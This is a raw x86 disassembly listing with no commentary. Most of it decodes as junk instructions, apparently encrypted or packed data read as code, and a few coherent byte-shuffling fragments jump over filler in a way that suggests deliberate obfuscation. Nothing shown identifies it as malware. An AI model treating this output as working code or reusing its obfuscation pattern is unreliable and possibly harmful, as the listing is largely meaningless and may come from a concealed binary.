  412cb5:	or     eax,0xfbf506c7
  412cba:	scas   al,BYTE PTR es:[edi]
  412cbb:	icebp  
  412cbc:	inc    eax
  412cbd:	pop    edi
  412cbe:	sbb    esp,DWORD PTR [eax+0x19bc4d23]
  412cc4:	popf   
  412cc5:	fnstsw WORD PTR [edx-0x60]
  412cc8:	es ret 0x14c7
  412ccc:	out    dx,eax
  412ccd:	xchg   BYTE PTR [eax-0x44],ah
  412cd0:	lods   eax,DWORD PTR ds:[esi]
  412cd1:	pushf  
  412cd2:	(bad)  
  412cd4:	sub    eax,0xfe6f4c78
  412cd9:	cld    
  412cda:	and    BYTE PTR [eax],al
  412cdc:	test   DWORD PTR [esi+0x51],0xcf73a35b
  412ce3:	aaa    
  412ce4:	cdq    
  412ce5:	mov    bh,0xe0
  412ce7:	daa    
  412ce8:	mov    ds:0x4b50c9bc,al
  412ced:	sbb    BYTE PTR [esi],dl
  412cef:	pop    ds
  412cf0:	pushf  
  412cf1:	loope  0x412ced
  412cf3:	retf   
  412cf4:	imul   eax,DWORD PTR [edi-0x187d4c27],0x541493f1
  412cfe:	add    ch,BYTE PTR [esp+ecx*8+0x78c2b2d6]
  412d05:	xor    al,0x3a
  412d07:	(bad)  
  412d09:	ret    0x381a
  412d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0d:	add    al,0x90
  412d0f:	push   ds
  412d10:	test   esp,ebx
  412d12:	and    ecx,DWORD PTR [esi+0xf774625]
  412d18:	xchg   esp,eax
  412d19:	mov    ebx,0xaadc300e
  412d1e:	es stos DWORD PTR es:[edi],eax
  412d20:	xchg   esi,eax
  412d21:	xor    ch,BYTE PTR [ebx-0x2f792be6]
  412d27:	add    esp,esp
  412d29:	fcom   DWORD PTR [ebx+ebx*1+0x50]
  412d2d:	add    dl,BYTE PTR [esi-0x3b8daa6b]
  412d33:	inc    esi
  412d34:	or     esp,DWORD PTR [edi+eiz*8]
  412d37:	sbb    eax,0x6f18badd
  412d3c:	loopne 0x412d2f
  412d3e:	pop    ds
  412d3f:	call   0xb507cbcf
  412d44:	retf   0x65c0
  412d47:	(bad)  
  412d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d49:	jbe    0x412ccc
  412d4b:	inc    esp
  412d4c:	xchg   ecx,eax
  412d4d:	push   ds
  412d4e:	adc    BYTE PTR [edx-0x605b25af],ch
  412d54:	test   BYTE PTR [ebx+0x3d],ch
  412d57:	jb     0x412cda
  412d59:	and    BYTE PTR [edi+0x5],ch
  412d5c:	in     eax,0x12
  412d5e:	jp     0x412da1
  412d60:	into   
  412d61:	shl    BYTE PTR [esp+esi*1+0x62c10ff6],cl
  412d68:	repnz imul DWORD PTR gs:[ecx-0x36581e53]
  412d70:	out    0x66,al
  412d72:	jge    0x412dd6
  412d74:	or     DWORD PTR ds:0xbb16145f,eax
  412d7a:	in     al,dx
  412d7b:	dec    edi
  412d7c:	sub    esi,DWORD PTR [ebx-0xc5bcfd1]
  412d82:	aad    0x64
  412d84:	add    BYTE PTR [ecx-0x6e78dd1a],bh
  412d8a:	sahf   
  412d8b:	loopne 0x412d93
  412d8d:	test   al,0x17
  412d8f:	test   BYTE PTR [edi+0x74],dl
  412d92:	mov    gs,WORD PTR [ebx+ebx*1+0x476a694d]
  412d99:	pusha  
  412d9a:	(bad)  
  412d9b:	lods   al,BYTE PTR ds:[esi]
  412d9c:	mov    BYTE PTR [ebx-0x1e],ch
  412d9f:	mov    al,ch
  412da1:	push   esp
  412da2:	(bad)  
  412da3:	std    
  412da4:	sub    ecx,eax
  412da6:	xchg   ebp,eax
  412da7:	gs push eax
  412da9:	mov    edx,ecx
  412dab:	or     BYTE PTR [eax-0x1595dc8d],ch
  412db1:	inc    ecx
  412db2:	out    dx,eax
  412db3:	js     0x412dd7
  412db5:	jp     0x412e0b
  412db7:	dec    ebx
  412db8:	rcr    BYTE PTR [esi+0x10],1
  412dbb:	(bad)  
  412dbc:	sub    DWORD PTR es:[esi],ebp
  412dbf:	mov    ds:0x30fe3cd7,al
  412dc4:	sbb    eax,0xd9d65867
  412dc9:	mov    esp,0x5800de07
  412dce:	and    al,0x19
  412dd0:	pop    eax
  412dd1:	imul   edx,DWORD PTR [esi],0x18c9d7f0
  412dd7:	fwait
  412dd8:	push   eax
  412dd9:	popa   
  412dda:	mov    DWORD PTR [edx+ebp*1+0x2],ebp
  412dde:	rcl    edx,1
  412de0:	leave  
  412de1:	xchg   ecx,eax
  412de2:	aas    
  412de3:	es dec eax
  412de5:	sub    esi,DWORD PTR [esp+eiz*8-0x10]
  412de9:	push   ecx
  412dea:	inc    esi
  412deb:	rcr    BYTE PTR [eax+0x5ae0f251],1
  412df1:	pushf  
  412df2:	setnp  BYTE PTR [edi]
  412df5:	pop    DWORD PTR [edx-0x70]
  412df8:	shr    esi,1
  412dfa:	dec    esi
  412dfb:	(bad)  
  412dfc:	aas    
  412dfd:	mov    ch,0x8e
  412dff:	push   es
  412e00:	dec    esp
  412e01:	add    edi,DWORD PTR [ebp+ebp*2-0x24]
  412e05:	xchg   ebx,eax
  412e06:	xor    al,0x4
  412e08:	fwait
  412e09:	push   esi
  412e0a:	test   eax,0x896070d
  412e0f:	dec    esp
  412e10:	mov    dl,0x32
  412e12:	sbb    DWORD PTR [ebx-0x6b],esp
  412e15:	jbe    0x412e80
  412e17:	dec    eax
  412e18:	sub    dl,BYTE PTR [ebx]
  412e1a:	sub    cl,BYTE PTR [ecx]
  412e1c:	test   DWORD PTR [edi],ebx
  412e1e:	fist   WORD PTR [edi-0x47]
  412e21:	sbb    eax,0xac87f735
  412e26:	xchg   ebx,eax
  412e27:	clc    
  412e28:	mov    bh,0x1b
  412e2a:	repnz add esi,DWORD PTR [ecx]
  412e2d:	cs pop edi
  412e2f:	pop    ss
  412e30:	inc    edx
  412e31:	pop    ecx
  412e32:	sub    al,0xec
  412e34:	fist   DWORD PTR [ebx+0x2ea3d34b]
  412e3a:	call   0xf6467fc0
  412e3f:	adc    bh,BYTE PTR [ecx+0x34b9b975]
  412e45:	sbb    BYTE PTR [eax-0x51],bh
  412e48:	cmp    al,0xba
  412e4a:	ss in  eax,0x37
  412e4d:	fiadd  DWORD PTR [edx]
  412e4f:	(bad)  
  412e51:	cmp    DWORD PTR [eax+0x3b],edi
  412e54:	xor    al,0xb3
  412e56:	adc    ebx,DWORD PTR [ecx]
  412e58:	jl     0x412ebb
  412e5a:	mov    bh,0x5b
  412e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e5d:	scas   al,BYTE PTR es:[edi]
  412e5e:	or     esp,ebx
  412e60:	cmp    BYTE PTR [edx-0x458abdd6],0x8c
  412e67:	inc    esp
  412e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e69:	out    dx,al
  412e6a:	push   esi
  412e6b:	jle    0x412ea5
  412e6d:	lods   al,BYTE PTR ds:[esi]
  412e6e:	pushf  
  412e6f:	mov    al,0x6
  412e71:	sub    bh,BYTE PTR [ebx]
  412e73:	mov    dh,0x8f
  412e75:	mov    ds:0x222d7c47,eax
  412e7a:	mov    ecx,ecx
  412e7c:	mov    BYTE PTR [ebx],0xed
  412e7f:	call   0xa0832b31
  412e84:	mov    dl,0xd1
  412e86:	or     BYTE PTR [esi+0x4a],ch
  412e89:	jb     0x412e2c
  412e8b:	mov    edi,0xe96403a7
  412e90:	dec    edx
  412e91:	in     al,dx
  412e92:	or     BYTE PTR [edx],ah
  412e94:	mov    eax,ds:0x82c7098b
  412e99:	std    
  412e9a:	sahf   
  412e9b:	and    ecx,DWORD PTR [edi-0x5d60d47b]
  412ea1:	mov    eax,ds:0xb3cb616d
  412ea6:	jae    0x412ef6
  412ea8:	dec    ebp
  412ea9:	sbb    eax,0xffc296f0
  412eae:	adc    BYTE PTR [edx-0x579331dc],dh
  412eb4:	rcr    DWORD PTR [edi+0x79a2425e],1
  412eba:	setns  BYTE PTR [edi]
  412ebd:	enter  0xdee1,0x6f
  412ec1:	fist   WORD PTR [ebx+0x6c]
  412ec4:	mov    cl,0x1
  412ec6:	add    edi,DWORD PTR [edi-0x63]
  412ec9:	push   edx
  412eca:	pushf  
  412ecb:	mov    ebx,fs
  412ecd:	ret    0xb26b
  412ed0:	push   edx
  412ed1:	xor    eax,DWORD PTR [ebx+0x27fd10d7]
  412ed7:	push   0x6944e3cd
  412edc:	jbe    0x412ebe
  412ede:	lds    esi,FWORD PTR [edi]
  412ee0:	pop    ss
  412ee1:	jl     0x412f21
  412ee3:	inc    ecx
  412ee4:	adc    dh,BYTE PTR [edi+0x7a]
  412ee7:	sbb    eax,0xa64135bc
  412eec:	jg     0x412f5b
  412eee:	sbb    edx,ebx
  412ef0:	inc    esp
  412ef1:	jecxz  0x412f56
  412ef3:	je     0x412f28
  412ef5:	fmul   st,st(7)
  412ef7:	mov    WORD PTR [eax-0x78],ds
  412efa:	push   ebp
  412efb:	jnp    0xd0752356
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x77
  412f26:	xor    cl,BYTE PTR [eax+0x7875691e]
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412f89
  412f32:	xchg   ebx,eax
  412f33:	in     al,dx
  412f34:	sub    bh,BYTE PTR [esi+0x10]
  412f37:	jl     0x412fa2
  412f39:	mov    al,ds:0xf2c1bd8a
  412f3e:	es xor eax,0xb82f1e6c
  412f44:	enter  0x6c39,0x83
  412f48:	push   es
  412f49:	loop   0x412f0b
  412f4b:	or     esi,DWORD PTR [ecx+0x63eb62b1]
  412f51:	mov    ebp,0x95238518
  412f56:	fucomp st(2)
  412f58:	dec    eax
  412f59:	and    eax,0xf245535c
  412f5e:	fild   DWORD PTR [eax-0x241e8df6]
  412f64:	inc    edx
  412f65:	xchg   edi,eax
  412f66:	sbb    BYTE PTR [ebx-0x30daa9a],0xcc
  412f6d:	push   ebx
  412f6e:	jbe    0x412fe7
  412f70:	jmp    0x5b85:0x471a7ab1
  412f77:	stos   DWORD PTR es:[edi],eax
  412f78:	dec    esi
  412f79:	popf   
  412f7a:	add    DWORD PTR [edi],ebp
  412f7c:	lods   eax,DWORD PTR ds:[esi]
  412f7d:	loope  0x412f77
  412f7f:	xchg   esp,eax
  412f80:	adc    esi,esi
  412f82:	sahf   
  412f83:	push   0xa
  412f85:	div    ebp
  412f87:	push   0x69
  412f89:	(bad)  
  412f8b:	mov    dh,0x4b
  412f8d:	scas   al,BYTE PTR es:[edi]
  412f8e:	jg     0x412f3b
  412f90:	out    dx,al
  412f91:	in     al,dx
  412f92:	and    DWORD PTR [ecx],edi
  412f94:	shl    BYTE PTR [edi+0x5c],cl
  412f97:	jne    0x41300c
  412f99:	cwde   
  412f9a:	xchg   ebp,eax
  412f9b:	fstp   st(5)
  412f9d:	loop   0x412fb9
  412f9f:	shl    BYTE PTR [edx+eiz*4-0x174b0095],cl
  412fa6:	jle    0x412fe1
  412fa8:	sbb    BYTE PTR ds:0x131fbcc3,0xd3
  412faf:	(bad)  
  412fb0:	cld    
  412fb1:	xchg   edi,eax
  412fb2:	dec    edi
  412fb3:	nop
  412fb4:	lods   eax,DWORD PTR ds:[esi]
  412fb5:	fcmove st,st(6)
  412fb7:	adc    BYTE PTR [ecx+0xa6897cd],ah
  412fbd:	mov    gs,WORD PTR [ebx-0x3c]
  412fc0:	pop    esi
  412fc1:	mov    ecx,0x45d8b303
  412fc6:	loope  0x413014
  412fc8:	add    edi,DWORD PTR [edx+eiz*2-0x40db86ca]
  412fcf:	iret   
  412fd0:	call   0x93b1b1a6
  412fd5:	sub    ecx,ebx
  412fd7:	das    
  412fd8:	ror    DWORD PTR [ebx+0x54],cl
  412fdb:	iret   
  412fdc:	pushf  
  412fdd:	or     edi,DWORD PTR [ebx+0x6b]
  412fe0:	scas   eax,DWORD PTR es:[edi]
  412fe1:	sub    esp,DWORD PTR [ecx+esi*2-0x7f]
  412fe5:	xchg   ebx,eax
  412fe6:	out    0x21,al
  412fe8:	test   BYTE PTR [ecx-0x27f1303a],al
  412fee:	adc    ecx,DWORD PTR [esi-0x6a]
  412ff1:	loope  0x412fee
  412ff3:	inc    ecx
  412ff4:	jb     0x413061
  412ff6:	xchg   esi,eax
  412ff7:	mov    esi,ebx
  412ff9:	push   ebx
  412ffa:	pop    ebx
  412ffb:	repnz xchg ebp,eax
  412ffd:	clc    
  412ffe:	je     0x412f86
  413000:	fcom   DWORD PTR [ecx]
  413002:	pop    edi
  413003:	pusha  
  413004:	sbb    dh,BYTE PTR [ebp+0x5056b4a1]
  41300a:	je     0x413030
  41300c:	lea    esi,[ebp+0x2]
  41300f:	adc    al,0x5a
  413011:	les    ecx,FWORD PTR [ebp+0x74fae211]
  413017:	mov    eax,ds:0x978e1c0e
  41301c:	jnp    0x413028
  41301e:	pushf  
  41301f:	inc    edi
  413020:	loope  0x413077
  413022:	lahf   
  413023:	(bad)  
  413024:	es xchg ecx,eax
  413026:	es xchg edx,eax
  413028:	mov    dh,0x7
  41302a:	mov    ah,0xe6
  41302c:	sbb    BYTE PTR [eax],bh
  41302e:	mov    WORD PTR [eax+0x5],si
  413032:	push   ebp
  413033:	jp     0x412fe6
  413035:	sub    DWORD PTR [edx-0x6569bafb],ebp
  41303b:	inc    ebx
  41303c:	js     0x413061
  41303e:	(bad)  
  41303f:	adc    edi,ebx
  413041:	(bad)  
  413042:	std    
  413043:	cmp    eax,0x8d7ac23e
  413048:	push   esp
  413049:	icebp  
  41304a:	add    dh,ah
  41304c:	mov    esp,0x7d8fcae4
  413051:	push   ds
  413052:	or     ch,BYTE PTR [ebx-0x24]
  413055:	mov    ds:0x5613eea,eax
  41305a:	idiv   BYTE PTR [ebx-0x5b]
  41305d:	jecxz  0x413071
  41305f:	lahf   
  413060:	jo     0x413085
  413062:	add    BYTE PTR [esi+ebp*1+0x2c1a352e],0xaf
  41306a:	popa   
  41306b:	adc    al,0xed
  41306d:	das    
  41306e:	add    edi,eax
  413070:	mov    al,ds:0xd4b2fc63
  413075:	dec    esi
  413076:	mov    eax,ds:0x7a1b5395
  41307b:	or     al,0x3f
  41307d:	inc    ecx
  41307e:	int3   
  41307f:	jo     0x4130f9
  413081:	xor    eax,edx
  413083:	adc    al,0x6f
  413085:	jb     0x4130f1
  413087:	shl    esi,cl
  413089:	loop   0x413087
  41308b:	les    esi,FWORD PTR [esi+0x26b6ad27]
  413091:	adc    BYTE PTR [ebp+0x4f],bl
  413094:	int    0x98
  413096:	bound  eax,QWORD PTR [edx]
  413098:	cmp    bh,BYTE PTR [edi]
  41309a:	jno    0x4130f8
  41309c:	ror    DWORD PTR [ebx-0x35e5006e],1
  4130a2:	call   0xbb26:0x214bf63c
  4130a9:	sti    
  4130aa:	mov    esi,0x541282d3
  4130af:	adc    ecx,ecx
  4130b1:	mov    cl,BYTE PTR [edx-0x7c]
  4130b4:	cmp    ch,bl
  4130b6:	mov    eax,esi
  4130b8:	push   esi
  4130b9:	pushf  
  4130ba:	nop
  4130bb:	push   ebp
  4130bc:	cmc    
  4130bd:	shl    BYTE PTR [edi+0x2b],1
  4130c0:	mov    al,ds:0xd8056420
  4130c5:	test   al,0x7d
  4130c7:	and    esi,DWORD PTR [esi+0x61d277b4]
  4130cd:	xor    al,0x2d
  4130cf:	stos   DWORD PTR es:[edi],eax
  4130d0:	js     0x4130bd
  4130d2:	mov    esp,DWORD PTR [ebp-0x1085a581]
  4130d8:	retf   
  4130d9:	aad    0x18
  4130db:	es inc edi
  4130dd:	and    BYTE PTR [ebp+0x1fcc5c15],cl
  4130e3:	pop    ds
  4130e4:	mov    eax,ds:0x43302c5f
  4130e9:	push   esp
  4130ea:	imul   edx,DWORD PTR [esi+0x78be8e06],0xffffffe9
  4130f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130f2:	sbb    al,0xc6
  4130f4:	imul   eax,DWORD PTR [edx],0x50
  4130f7:	nop
  4130f8:	(bad)  
  4130f9:	in     al,dx
  4130fa:	lahf   
  4130fb:	mov    DWORD PTR [ecx+0x69],edi
  4130fe:	rol    BYTE PTR [edi+0x16],0xa9
  413102:	nop
  413103:	dec    ecx
  413104:	xor    cl,BYTE PTR [ecx-0x12]
  413107:	mov    ds:0x64ab31b7,al
  41310c:	cmp    DWORD PTR [ebx+0x7b],esi
  41310f:	mov    edi,0xa91b4819
  413114:	sti    
  413115:	pop    edi
  413116:	xor    al,cl
  413118:	fcomp  st(6)
  41311a:	(bad)
  41311d:	outs   dx,DWORD PTR ds:[esi]
  41311e:	and    ebx,esp
  413120:	mov    al,ds:0x7682df8f
  413125:	push   0xffffffe5
  413127:	mov    DWORD PTR [edi+0x30],eax
  41312a:	fst    QWORD PTR [ebx+0x12e73995]
  413130:	xchg   cl,al
  413132:	mov    BYTE PTR [edi-0x1eed7b8b],al
  413138:	adc    ch,ah
  41313a:	ficom  DWORD PTR [edi+0x7d026b6a]
  413140:	push   eax
  413141:	push   esp
  413142:	adc    BYTE PTR [edx+0x38],al
  413145:	mov    dl,BYTE PTR [esi]
  413147:	jns    0x41316f
  413149:	xor    eax,DWORD PTR [eax]
  41314b:	jne    0x413125
  41314d:	sbb    al,0xab
  41314f:	ficomp WORD PTR [ecx]
  413151:	cmovp  esi,DWORD PTR [edi-0x1bdcefa8]
  413158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413159:	test   DWORD PTR [ebp+0x424592c9],edi
  41315f:	mov    bh,0x32
  413161:	(bad)  
  413162:	and    BYTE PTR [esi],dl
  413164:	mov    eax,ds:0xc3f4549
  413169:	mov    esi,cr5
  41316c:	fisubr WORD PTR [ebx-0x47]
  41316f:	dec    ebx
  413170:	fdiv   st,st(6)
  413172:	fwait
  413173:	loop   0x413149
  413175:	stos   DWORD PTR es:[edi],eax
  413176:	test   eax,0xa23e1d74
  41317b:	cmp    eax,0xbb60c15e
  413180:	ins    BYTE PTR es:[edi],dx
  413181:	out    0x83,al
  413183:	(bad)  
  413184:	retf   0x471d
  413187:	cs inc eax
  413189:	jne    0x413115
  41318b:	add    dh,BYTE PTR ds:0xcf181014
  413191:	jo     0x41318e
  413193:	sub    BYTE PTR cs:[ebx-0x15080444],ah
  41319a:	rcl    BYTE PTR [ebp+0x33f47d8b],1
  4131a0:	clc    
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	clc    
  4131c8:	repz mov dl,0x74
  4131cb:	(bad)  
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x4131f3
  4131d4:	lahf   
  4131d5:	add    al,BYTE PTR [esi]
  4131d7:	enter  0x1813,0x7a
  4131db:	adc    edi,DWORD PTR ds:0xea43667a
  4131e1:	mov    ss,WORD PTR [edx+0x54]
  4131e4:	add    ebp,esi
  4131e6:	jl     0x413240
  4131e8:	std    
  4131e9:	aad    0x58
  4131eb:	dec    ebx
  4131ec:	ror    bl,1
  4131ee:	jbe    0x4131fb
  4131f0:	je     0x4131c7
  4131f2:	aaa    
  4131f3:	add    dl,al
  4131f5:	dec    eax
  4131f6:	dec    esi
  4131f7:	ins    BYTE PTR es:[edi],dx
  4131f8:	sbb    eax,0x6aa2e110
  4131fd:	enter  0x3dc4,0x81
  413201:	in     al,0x40
  413203:	xchg   edx,eax
  413204:	fwait
  413205:	je     0x413233
  413207:	or     al,0x3c
  413209:	pop    ds
  41320a:	mov    ebp,0x36274b31
  41320f:	int3   
  413210:	in     eax,dx
  413211:	inc    edx
  413212:	sub    eax,0x811843ca
  413217:	pop    ebx
  413218:	push   edx
  413219:	fld    TBYTE PTR [edi+0x1d82f261]
  41321f:	addr16 push eax
  413221:	inc    eax
  413222:	neg    DWORD PTR [edi]
  413224:	loopne 0x41323c
  413226:	dec    edx
  413227:	inc    esi
  413228:	push   ebx
  413229:	xor    ch,BYTE PTR [esi+ebp*8-0x42]
  41322d:	cli    
  41322e:	cmp    eax,0x9319952b
  413233:	ror    BYTE PTR [esi],cl
  413235:	pop    ds
  413236:	cmp    ah,bl
  413238:	pushf  
  413239:	out    dx,eax
  41323a:	xchg   edi,eax
  41323b:	xchg   ebp,eax
  41323c:	or     eax,0x6c7528eb
  413241:	imul   edi,DWORD PTR [edi],0x589e9e42
  413247:	push   es
  413248:	pop    ecx
  413249:	add    al,0xbb
  41324b:	pop    edx
  41324c:	add    eax,0xde3d5491
  413251:	test   eax,0x441f794c
  413256:	mov    bh,0x32
  413258:	fwait
  413259:	mov    ch,0xb3
  41325b:	dec    esp
  41325c:	mov    ecx,0xb275dceb
  413261:	pop    ecx
  413262:	pop    ebp
  413263:	adc    edi,DWORD PTR [edx-0x53]
  413266:	pushf  
  413267:	add    al,0x83
  413269:	mov    ecx,0xe376ac66
  41326e:	fsubrp st(6),st
  413270:	jl     0x413205
  413272:	inc    edi
  413273:	ins    BYTE PTR es:[edi],dx
  413274:	neg    DWORD PTR [esi]
  413276:	or     al,0xbe
  413278:	jne    0x413248
  41327a:	ret    0x2f41
  41327d:	inc    eax
  41327e:	call   0x2c171f8
  413283:	mov    ebx,0x41a9d2e7
  413288:	outs   dx,DWORD PTR ds:[esi]
  413289:	jp     0x4132b0
  41328b:	sub    ch,bh
  41328d:	xchg   edx,eax
  41328e:	nop
  41328f:	xor    bl,BYTE PTR [ebp-0x43e7eaf1]
  413295:	pop    ss
  413296:	dec    eax
  413297:	mov    dl,0x6e
  413299:	push   ds
  41329a:	dec    ebx
  41329b:	jne    0x41328e
  41329d:	not    BYTE PTR [edx-0xad303f5]
  4132a3:	sbb    cl,BYTE PTR [bx+0xb79]
  4132a8:	mov    BYTE PTR [ecx-0x3d914df9],0xae
  4132af:	push   ecx
  4132b0:	ss jg  0x413321
  4132b3:	mov    ds:0xb403a0fd,eax
  4132b8:	sub    ebx,eax
  4132ba:	std    
  4132bb:	xchg   ecx,eax
  4132bc:	pop    edi
  4132bd:	fisub  WORD PTR [ebp+0xe37db56]
  4132c3:	push   0x47494a27
  4132c8:	push   ds
  4132c9:	dec    DWORD PTR [ecx-0x1d]
  4132cc:	mov    ebp,0xc0d214a6
  4132d1:	test   DWORD PTR [ebp-0x38],0xa41a38ef
  4132d8:	dec    edx
  4132d9:	aas    
  4132da:	mov    ds:0x33d438e1,eax
  4132df:	dec    edx
  4132e0:	imul   esi,DWORD PTR [esi],0xb71b4f01
  4132e6:	add    dl,BYTE PTR [ecx+0x7ad6fe1f]
  4132ec:	rol    BYTE PTR [edx+0x24dadd02],0xe4
  4132f3:	and    BYTE PTR [edx+0x3d6afbc5],bl
  4132f9:	inc    edi
  4132fa:	sub    eax,0xed623d4b
  4132ff:	push   0x65353e6d
  413304:	out    0xc6,eax
  413306:	addr16 out 0xa5,al
  413309:	aam    0x33
  41330b:	aam    0xe3
  41330d:	scas   al,BYTE PTR es:[edi]
  41330e:	fdiv   st,st(1)
  413310:	enter  0xd799,0x88
  413314:	mov    edi,0x52caa66b
  413319:	add    BYTE PTR [esp+ebx*4+0x362a3892],ch
  413320:	dec    eax
  413321:	or     DWORD PTR [esi-0x15],0xfffffffd
  413325:	inc    ebp
  413326:	pop    edi
  413327:	rcr    dh,1
  413329:	hlt    
  41332a:	dec    edx
  41332b:	outs   dx,DWORD PTR ds:[esi]
  41332c:	jecxz  0x41334e
  41332e:	pop    es
  41332f:	int    0xc6
  413331:	fs mov al,0x73
  413334:	pop    eax
  413335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413336:	mov    ah,0xf
  413338:	inc    ecx
  413339:	sbb    al,0x87
  41333b:	inc    esp
  41333c:	mov    bh,0x34
  41333e:	mov    eax,0x9a01aaa6
  413343:	mov    esi,ds
  413345:	ss xchg edx,eax
  413347:	mov    WORD PTR [esi],es
  413349:	inc    esi
  41334a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334b:	jmp    0x1b2d:0x17a90c91
  413352:	lds    esi,FWORD PTR [esp+ebx*1-0x6]
  413356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413357:	xor    ch,bh
  413359:	pusha  
  41335a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41335b:	mov    cl,0x86
  41335d:	adc    al,0x35
  41335f:	fyl2xp1 
  413361:	sbb    DWORD PTR [edi+edx*8],edi
  413364:	mov    cl,0xf3
  413366:	test   al,0x1a
  413368:	jb     0x4133b0
  41336a:	cmp    DWORD PTR [ebp-0x6c],0xe259ecd0
  413371:	push   ss
  413372:	adc    ch,0x5e
  413375:	jmp    0x413341
  413377:	retf   0xf30
  41337a:	test   BYTE PTR [ebx-0x5e],ch
  41337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41337e:	cmc    
  41337f:	pop    edi
  413380:	mov    ch,bh
  413382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413383:	push   0xd3d09a8
  413388:	call   0x14eb7821
  41338d:	jmp    0x413406
  41338f:	in     al,dx
  413390:	inc    ebp
  413391:	div    dh
  413393:	adc    dh,BYTE PTR [ebp-0x5e]
  413396:	jnp    0x4133ba
  413398:	aaa    
  413399:	stos   DWORD PTR es:[edi],eax
  41339a:	xchg   ecx,eax
  41339b:	push   0xffffff88
  41339d:	push   ecx
  41339e:	ret    
  41339f:	in     eax,0x1c
  4133a1:	lds    ecx,FWORD PTR [ebp+eax*2+0x72a841af]
  4133a8:	adc    DWORD PTR [edx-0x5e],ecx
  4133ab:	les    ebp,FWORD PTR [esi-0x4a]
  4133ae:	fstp   TBYTE PTR [ebp+0x79]
  4133b1:	pop    esi
  4133b2:	into   
  4133b3:	mov    ah,0x14
  4133b5:	idiv   BYTE PTR cs:[ebp+0x44]
  4133b9:	aas    
  4133ba:	js     0x4133a7
  4133bc:	test   dh,bh
  4133be:	mov    bh,0x92
  4133c0:	sti    
  4133c1:	sahf   
  4133c2:	adc    edi,edx
  4133c4:	dec    ebx
  4133c5:	mov    ds:0x9549da5a,al
  4133ca:	in     al,dx
  4133cb:	or     edi,DWORD PTR [ebp-0x52bcbf75]
  4133d1:	sbb    dl,BYTE PTR [ebx-0x64]
  4133d4:	jg     0x413372
  4133d6:	icebp  
  4133d7:	xchg   edi,eax
  4133d8:	jle    0x413398
  4133da:	call   0x52137757
  4133df:	xor    DWORD PTR [edx-0x37],0xa68ce2e0
  4133e6:	dec    esi
  4133e7:	xchg   ebx,eax
  4133e8:	cmp    ch,BYTE PTR [edx]
  4133ea:	rcr    DWORD PTR [ecx-0x4cc3ce2a],cl
  4133f0:	mov    eax,ds:0xab8a05fb
  4133f5:	sub    DWORD PTR [ecx],0x53
  4133f8:	popf   
  4133f9:	clc    
  4133fa:	pop    ecx
  4133fb:	and    DWORD PTR [edi],ecx
  4133fd:	maxps  xmm6,xmm5
  413400:	imul   eax,edi,0xe4e7c6b9
  413406:	push   ecx
  413407:	mov    esp,0x690ddc31
  41340c:	mov    ebx,0x93ef7fed
  413411:	pop    esi
  413412:	cmp    bh,0xbc
  413415:	pop    es
  413416:	shr    BYTE PTR [edi-0x70],cl
  413419:	test   DWORD PTR [esi-0x30],eax
  41341c:	mov    ds,WORD PTR [edi-0x4b17223c]
  413422:	mov    al,ds:0x6184f3b5
  413427:	adc    DWORD PTR ds:0xd04b66a3,edx
  41342d:	mov    ch,0x21
  41342f:	rcr    BYTE PTR [ebp-0x5c],0xd0
  413433:	sbb    BYTE PTR [ebx-0x4f],0x98
  413437:	sbb    al,0x85
  413439:	and    DWORD PTR [ebx*2+0x7d037bcc],0xffffffec
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x6150e5e
  41345f:	test   DWORD PTR [ebx+0x78],eax
  413462:	jg     0x4134dc
  413464:	in     eax,0x7e
  413466:	js     0x4134e0
  413468:	rol    DWORD PTR [eax+0x78fabdb3],1
  41346e:	hlt    
  41346f:	int    0x48
  413471:	loop   0x413478
  413473:	pop    edx
  413474:	in     eax,dx
  413475:	lds    edx,FWORD PTR [ebx+ebx*1]
  413478:	cs mov esp,0xb406dd0f
  41347e:	retf   0x3f67
  413481:	adc    cl,bl
  413483:	mov    bl,0x80
  413485:	jb     0x413494
  413487:	fst    QWORD PTR [esp+ebx*4+0x6b]
  41348b:	mov    ebp,0x1d37fd9b
  413490:	sbb    eax,0x1a84ce08
  413495:	push   esp
  413496:	aad    0x89
  413498:	imul   DWORD PTR [edi+0x24115b38]
  41349e:	mov    edi,0xc0b7efe9
  4134a3:	jne    0x4134fe
  4134a5:	dec    edx
  4134a6:	aas    
  4134a7:	sub    eax,0xbe098d5
  4134ac:	pop    eax
  4134ad:	rcl    BYTE PTR [edi+eax*8],0xda
